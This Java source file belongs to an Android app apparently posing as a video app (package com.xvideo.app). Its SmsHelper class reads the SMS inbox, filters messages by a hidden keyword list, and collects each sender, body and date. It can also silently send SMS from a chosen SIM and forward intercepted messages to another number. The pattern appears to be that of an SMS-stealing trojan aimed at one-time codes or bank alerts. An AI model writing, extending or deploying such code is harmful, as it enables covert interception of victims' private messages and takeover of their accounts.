package com.xvideo.app.sms;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import com.xvideo.app.core.Config;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class SmsHelper {
    private static final String TAG = "SmsHelper";
    private final Context context;

    public SmsHelper(Context context) {
        this.context = context;
    }

    public List<Map<String, Object>> getAllMessages(int limit) {
        List<Map<String, Object>> messages = new ArrayList<>();

        try {
            Uri uri = Uri.parse("content://sms/inbox");
            String[] projection = {"_id", "address", "body", "date", "type"};

            Cursor cursor = context.getContentResolver().query(
                uri, projection, null, null, "date DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < limit) {
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));

                    // Filter for important SMS
                    if (containsKeyword(body)) {
                        Map<String, Object> sms = new HashMap<>();
                        sms.put("id", cursor.getLong(cursor.getColumnIndexOrThrow("_id")));
                        sms.put("sender", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", body);
                        sms.put("date", formatDate(cursor.getLong(cursor.getColumnIndexOrThrow("date"))));
                        sms.put("type", cursor.getInt(cursor.getColumnIndexOrThrow("type")) == 1 ? "received" : "sent");
                        messages.add(sms);
                        count++;
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS", e);
        }

        return messages;
    }

    private boolean containsKeyword(String body) {
        if (body == null) return false;
        String lower = body.toLowerCase();
        for (String keyword : Config.SMS_KEYWORDS) {
            if (lower.contains(keyword.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private String formatDate(long timestamp) {
        return new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(new Date(timestamp));
    }

    public static boolean sendSms(Context context, String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> parts = smsManager.divideMessage(message);
            smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
            Log.d(TAG, "SMS sent to: " + phoneNumber);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS", e);
            return false;
        }
    }

    public static boolean sendSmsWithSim(Context context, int simSlot, String phoneNumber, String message) {
        try {
            SubscriptionManager sm = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm == null) {
                return sendSms(context, phoneNumber, message);
            }

            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs == null || subs.isEmpty()) {
                return sendSms(context, phoneNumber, message);
            }

            if (simSlot < 0 || simSlot >= subs.size()) {
                simSlot = 0;
            }

            int subId = subs.get(simSlot).getSubscriptionId();
            SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(subId);
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            Log.d(TAG, "SMS sent via SIM " + (simSlot + 1) + " to: " + phoneNumber);
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS with SIM", e);
            return sendSms(context, phoneNumber, message);
        }
    }

    public static void forwardSms(Context context, String originalSender, String body, String forwardTo) {
        String forwardMessage = "From: " + originalSender + "\n" + body;
        sendSms(context, forwardTo, forwardMessage);
    }
}
